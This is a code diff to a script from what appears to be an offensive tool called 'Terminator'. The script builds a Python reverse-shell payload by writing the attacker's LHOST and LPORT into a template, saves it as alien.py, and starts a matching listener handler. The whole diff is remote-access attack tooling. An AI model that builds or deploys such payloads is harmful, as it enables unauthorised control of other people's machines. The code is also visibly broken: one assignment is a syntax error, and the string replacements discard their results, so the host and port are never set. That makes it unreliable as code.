@@ -10,7 +10,7 @@ PAYLOAD="payload/win/win_reverse_shell"
 LHOST=""
 LPORT=""
 ERR_TEXT=""
-SHELL=Fore.RESET+"Payload: "+Fore.RED+PAYLOAD+Fore.RESET
+SHELL=Style.BRIGHT"MULTI-HANDLER"+Style.RESET_ALL
 RUN_TEXT=""
 DEVICE_NAME=""
 shw = '''
@@ -319,18 +319,16 @@ Handler Details:
                 print(Fore.BLUE+'[*]'+Fore.RESET+' Generating Python Payload...')
                 with open("/usr/share/Terminator/modules/payloads/alien-shell.log", "r+") as alien:
                     for line in alien:
-                        if 'HOST    = "YOUR IP"' in line:
-                            data = alien.read()
-                            print(Fore.YELLOW+'[+]'+Fore.RESET+' Changing LHOST, LPORT...')
-                            data.replace('HOST    = "YOUR IP"', f'HOST    = "{LHOST}"')
-                            data.replace("PORT    = 4556", f"PORT    = {LPORT}")
-                        print(Fore.BLUE+'[*]'+Fore.RESET+f' Building, Changing --> {line}')
+                      data = alien.read()
+                      print(Fore.YELLOW+'[+]'+Fore.RESET+' Changing LHOST, LPORT...')
+                      data.replace('HOST    = "YOUR IP"', f'HOST    = "{LHOST}"')
+                      data.replace('PORT    = 4556', f'PORT    = {LPORT}')
                 print(Fore.BLUE+'[*]'+Fore.RESET+' Saving Payload As .PY...')
                 os.system('touch /root/.tmf/alien.py > /dev/null 2>&1')
                 with open('/root/.tmf/alien.py', 'w') as alien_load:
                     alien_load.write(data)
                 print(Fore.YELLOW+'[+]'+Fore.RESET+' Saved At: "/root/.tmf" as alien.py')
-                print(Fore.BLUE+'[*]'+Fore.RESET+' Initiliazing Connections...')
+                print(Fore.BLUE+'[*]'+Fore.RESET+' Initiliazing Connection...')
                 time.sleep(1)
                 try:
                     os.system('python3 /usr/share/Terminator/lib/data/handlers/alien-shell-handler.py '+LHOST+' '+LPORT)
